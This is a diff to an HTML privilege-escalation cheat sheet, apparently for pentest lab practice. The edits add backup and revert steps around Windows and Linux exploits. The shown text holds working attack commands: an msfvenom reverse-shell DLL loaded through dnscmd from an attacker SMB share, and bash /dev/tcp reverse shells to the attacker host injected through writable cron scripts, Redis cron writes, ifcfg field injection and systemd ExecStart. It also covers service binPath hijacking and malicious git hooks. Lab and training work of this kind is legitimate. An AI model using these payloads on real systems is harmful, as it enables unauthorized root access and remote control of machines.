@@ -1233,9 +1233,9 @@ Restore-ServiceBinary -Name '&lt;ServiceName&gt;'</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Check if you can change service config (requires SERVICE_CHANGE_CONFIG)</div>
 <pre class="cmd">{{WPATH}}\accesschk.exe -uwcqv "{{USER}}" &lt;ServiceName&gt; /accepteula
 # Look for: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS</pre></div>
-<div class="cmd-wrap"><div class="cmd-label">BACKUP — note current binPath before changing</div>
-<pre class="cmd">sc.exe qc &lt;ServiceName&gt;
-# Copy "BINARY_PATH_NAME" value — you will need it for restore</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">BACKUP — save current binPath to file before changing</div>
+<pre class="cmd">for /f "tokens=*" %i in ('sc qc ^&lt;ServiceName^&gt; ^| findstr BINARY') do echo %i &gt; {{WPATH}}\svc_original_binpath.txt
+REM Save original binPath before changing it — read with: type {{WPATH}}\svc_original_binpath.txt</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">EXPLOIT — point service at your payload (NOTE the SPACE after binPath=)</div>
 <pre class="cmd">sc.exe config &lt;ServiceName&gt; binPath= "{{WPATH}}\shell.exe"
 sc.exe stop &lt;ServiceName&gt;
@@ -2946,6 +2946,9 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePat
     <pre class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o privesc.dll</pre>
     <pre class="cmd">python3 -m http.server {{PORT}}</pre>
   </div>
+  <div class="pipe-step pipe-backup"><div class="pipe-step-label">BACKUP — save current DNS plugin config</div>
+    <pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll 2&gt;nul &amp;&amp; reg export HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters {{WPATH}}\dns_params_backup.reg /y || echo [INFO] ServerLevelPluginDll not set - will delete key to revert</pre>
+  </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">EXPLOIT</div>
     <pre class="cmd">dnscmd dc01 /config /serverlevelplugindll \\{{KALI_IP}}\share\privesc.dll
 # Replace dc01 with DC hostname; omit if running on DC itself</pre>
@@ -2953,6 +2956,12 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePat
   </div>
   <div class="pipe-step pipe-verify"><div class="pipe-step-label">SMB SHARE (Kali)</div>
     <pre class="cmd">impacket-smbserver share . -smb2support</pre>
+  </div>
+  <div class="pipe-step pipe-restore"><div class="pipe-step-label">REVERT — remove DNS plugin and restore service</div>
+    <pre class="cmd">dnscmd dc01 /config /serverlevelplugindll ""
+reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f
+sc stop dns &amp;&amp; sc start dns
+REM DNS plugin removed and service restarted cleanly</pre>
   </div>
 </div>
 <div class="callout callout-tip"><strong>💡 Alternative — UNC path</strong> Host the DLL on an SMB share and point dnscmd at it: <code>\\KALI_IP\share\privesc.dll</code></div>
@@ -4461,6 +4470,8 @@ wget http://{{KALI_IP}}:{{PORT}}/linux/exploit-suggester.py -O /tmp/exploit-sugg
 <tr><td><code>CVE-2010-3904</code></td><td class="impact-high">RDS</td><td>&lt;= 2.6.36-rc8</td><td>Legacy systems</td></tr>
 </tbody>
 </table></div>
+<div class="code-block orange">💾 BACKUP (CRITICAL — DirtyCow can corrupt /etc/passwd):
+cp /etc/passwd /tmp/passwd.bak &amp;&amp; echo "[BAK] /etc/passwd backed up to /tmp/passwd.bak"</div>
 <div class="callout callout-danger" style="margin-top:10px">
 <strong>🚨 DirtyCow (CVE-2016-5195) CRITICAL RESTORE STEP</strong><br>
 DirtyCow variants that overwrite <code>/etc/passwd</code> WILL corrupt the file if you don't restore it immediately. The machine becomes completely unrecoverable (no login possible).<br><br>
@@ -4468,6 +4479,8 @@ DirtyCow variants that overwrite <code>/etc/passwd</code> WILL corrupt the file 
 <pre class="cmd">mv /tmp/passwd.bak /etc/passwd   # restore original passwd
 # OR if the exploit created it at a different path:
 cp /etc/passwd.bak /etc/passwd</pre>
+<div class="code-block orange">↩ REVERT:
+cp /tmp/passwd.bak /etc/passwd &amp;&amp; echo "[RESTORED] /etc/passwd restored from backup"</div>
 <strong>Common DirtyCow variants:</strong>
 <ul style="margin:4px 0 0 16px">
   <li><code>dirtyc0w.c</code> / <code>cowroot.c</code> — overwrites /etc/passwd directly (MUST restore)</li>
@@ -4796,8 +4809,12 @@ ls /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/nu
 # Cross-check: if a file from find above appears in cron output = directly exploitable
 # Confirm you can write to it:
 [ -w /path/to/script ] && echo "[+] CONFIRMED writable — inject payload"</pre></div>
+<div class="code-block orange">💾 BACKUP:
+cp /path/to/writable/script.sh /tmp/$(basename /path/to/writable/script.sh).bak</div>
 <div class="cmd-wrap"><div class="cmd-label">Inject reverse shell into writable script</div>
 <pre class="cmd">echo 'bash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1' >> /path/to/writable/script.sh</pre></div>
+<div class="code-block orange">↩ REVERT:
+cp /tmp/$(basename /path/to/writable/script.sh).bak /path/to/writable/script.sh</div>
 <div class="notes-toggle" onclick="toggleNotes('lin-worldwrite')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-worldwrite" onchange="saveNote('lin-worldwrite',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -5430,6 +5447,9 @@ void dropshell(void) {
 EOF
 gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</pre>
   </div>
+  <div class="pipe-step pipe-backup"><div class="pipe-step-label">BACKUP — save /etc/ld.so.preload before poisoning it</div>
+    <pre class="cmd">cp /etc/ld.so.preload /tmp/ld.so.preload.bak 2&gt;/dev/null &amp;&amp; echo "[BAK] Existing ld.so.preload saved" || echo "[INFO] ld.so.preload did not exist"</pre>
+  </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">TRIGGER</div>
     <pre class="cmd">cd /etc
 umask 000
@@ -5440,10 +5460,13 @@ screen -ls</pre>
     <pre class="cmd">/tmp/rootshell
 id; whoami  # root</pre>
   </div>
-  <div class="pipe-step pipe-restore"><div class="pipe-step-label">RESTORE — cleanup all compiled artifacts</div>
+  <div class="pipe-step pipe-restore"><div class="pipe-step-label">RESTORE — cleanup all compiled artifacts and ld.so.preload</div>
     <pre class="cmd">rm -f /tmp/rootshell /tmp/rootshell.c /tmp/libhax.so /tmp/libhax.c
 # Verify /etc/ld.so.preload was cleaned up by the library itself:
-cat /etc/ld.so.preload 2>/dev/null || echo 'OK - file does not exist'</pre>
+cat /etc/ld.so.preload 2>/dev/null || echo 'OK - file does not exist'
+# If ld.so.preload still exists — remove it (run IMMEDIATELY: affects ALL processes):
+rm -f /etc/ld.so.preload &amp;&amp; echo "[RESTORED] ld.so.preload removed"
+# If it existed before: cp /tmp/ld.so.preload.bak /etc/ld.so.preload</pre>
   </div>
 </div>
 <div class="notes-toggle" onclick="toggleNotes('lin-screen-cve')">&#128221; Notes</div>
@@ -5513,6 +5536,19 @@ QUIT</pre></div>
 <tr><td>Zookeeper</td><td>Auth bypass / info leak</td><td><code>echo stat | nc TARGET 2181</code></td></tr>
 </tbody>
 </table></div>
+<div class="subsection"><div class="subsection-title">Redis Unauthenticated — Cron Job Injection (full steps)</div>
+<div class="callout callout-warn"><strong>⚠️ Redis SAVE will overwrite the crontab file with binary DB headers</strong> — always back up the existing root crontab first. If Redis corrupts the file, crontab -r removes it entirely.</div>
+<div class="code-block orange">💾 BACKUP (run before exploit — Redis SAVE will overwrite the crontab file with binary DB headers):
+crontab -l -u root > /tmp/root_crontab.bak 2>/dev/null && echo "[BAK] Root crontab saved" || echo "[INFO] No existing root crontab"</div>
+<div class="cmd-wrap"><div class="cmd-label">Redis cron injection — point Redis DB dir at cron spool, set filename, write payload, save</div>
+<pre class="cmd">redis-cli -h TARGET config set dir /var/spool/cron/
+redis-cli -h TARGET config set dbfilename root
+redis-cli -h TARGET set payload "\n\n* * * * * bash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1\n\n"
+redis-cli -h TARGET save</pre></div>
+<div class="code-block orange">↩ REVERT (run after getting shell):
+crontab /tmp/root_crontab.bak -u root 2>/dev/null && echo "[RESTORED] Root crontab restored" || crontab -r -u root
+echo "[INFO] If Redis corrupted the crontab, crontab -r -u root removes it entirely"</div>
+</div>
 <div class="cmd-wrap"><div class="cmd-label">General exploit search workflow</div>
 <pre class="cmd"># Find CVEs for identified service
 searchsploit SERVICE_NAME VERSION
@@ -5547,6 +5583,8 @@ grep -r "\bgit\b" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep "
 find / -user root -name "*.sh" -o -user root -name "*.py" 2>/dev/null \
   | xargs grep -l "\bgit\b" 2>/dev/null
 # Confirms exploit only if: git triggered by root process AND you can write to .git/hooks/</pre></div>
+<div class="code-block orange">💾 BACKUP (saves pre-existing hook — the &gt; operator will destroy it otherwise):
+cp /path/to/repo/.git/hooks/post-commit /tmp/post-commit.bak 2&gt;/dev/null &amp;&amp; echo "[BAK] Existing post-commit hook saved" || echo "[INFO] No pre-existing hook"</div>
 <div class="cmd-wrap"><div class="cmd-label">Create malicious post-commit hook (runs when git commit happens)</div>
 <pre class="cmd">cat &gt; /path/to/repo/.git/hooks/post-commit &lt;&lt; 'EOF'
 #!/bin/bash
@@ -5567,6 +5605,9 @@ chmod +x /path/to/repo/.git/hooks/post-commit
 touch /tmp/trigger
 git add /tmp/trigger
 git commit -m "trigger"   # This fires post-commit hook</pre></div>
+<div class="code-block orange">↩ REVERT:
+cp /tmp/post-commit.bak /path/to/repo/.git/hooks/post-commit 2&gt;/dev/null || rm -f /path/to/repo/.git/hooks/post-commit
+echo "[RESTORED] Git hook restored"</div>
 </div>
 <div class="subsection"><div class="subsection-title">Gitea Admin Exploitation</div>
 <div class="callout callout-warn"><strong>⚠️ Seen on: Craft (PG)</strong> Gitea admin panel lets you configure git hooks on repositories. Use this for RCE as the git service user.</div>
@@ -5762,9 +5803,15 @@ find /etc/sysconfig/network-scripts/ -name "ifcfg-*" -writable 2>/dev/null \
 sudo -l 2>/dev/null | grep -E "ifup|ifdown|network" && echo "[+] sudo ifup/ifdown available"
 sudo -l 2>/dev/null | grep -E "systemctl|service" && echo "[+] Can restart network service"
 # Confirms exploit: writable ifcfg + ability to trigger ifup/ifdown as root</pre></div>
+<div class="code-block orange">💾 BACKUP (CRITICAL — overwrites network interface config, losing it = no network):
+cp /etc/sysconfig/network-scripts/ifcfg-eth0 /tmp/ifcfg-eth0.bak &amp;&amp; echo "[BAK] ifcfg-eth0 saved"</div>
 <div class="cmd-wrap"><pre class="cmd"># Inject payload into NAME field (spaces become separate commands):
 echo 'NAME=eth0 bash -i &gt;&amp; /dev/tcp/{{KALI_IP}}/{{RPORT}} 0&gt;&amp;1' &gt; /etc/sysconfig/network-scripts/ifcfg-eth0
 sudo /sbin/ifdown eth0 &amp;&amp; sudo /sbin/ifup eth0</pre></div>
+<div class="code-block orange">↩ REVERT:
+cp /tmp/ifcfg-eth0.bak /etc/sysconfig/network-scripts/ifcfg-eth0
+nmcli connection reload 2&gt;/dev/null || systemctl restart network
+echo "[RESTORED] Network interface config restored"</div>
 </div>
 <div class="notes-toggle" onclick="toggleNotes('lin-sudo-misc')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-sudo-misc" onchange="saveNote('lin-sudo-misc',this.value)" placeholder="Add your notes here..."></textarea>
@@ -5804,11 +5851,18 @@ sudo -l 2>/dev/null | grep -E "systemctl|service" && echo "[+] sudo systemctl av
 # Check if the service is set to auto-restart (exploit fires on next restart automatically):
 systemctl show TARGET.service 2>/dev/null | grep "Restart="
 # Confirms exploit: writable .service file + sudo systemctl restart = exploitable</pre></div>
+<div class="code-block orange">💾 BACKUP:
+cp /lib/systemd/system/TARGET.service /tmp/TARGET.service.bak &amp;&amp; echo "[BAK] Service unit backed up"</div>
 <div class="cmd-wrap"><pre class="cmd"># Edit ExecStart in writable service file:
 nano /lib/systemd/system/TARGET.service
 # Change ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{{KALI_IP}}/{{RPORT}} 0&gt;&amp;1'
 sudo systemctl daemon-reload
 sudo systemctl restart TARGET</pre></div>
+<div class="code-block orange">↩ REVERT:
+cp /tmp/TARGET.service.bak /lib/systemd/system/TARGET.service
+systemctl daemon-reload
+systemctl restart TARGET
+echo "[RESTORED] Service unit file restored"</div>
 </div>
 <div class="notes-toggle" onclick="toggleNotes('lin-tmux')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-tmux" onchange="saveNote('lin-tmux',this.value)" placeholder="Add your notes here..."></textarea>
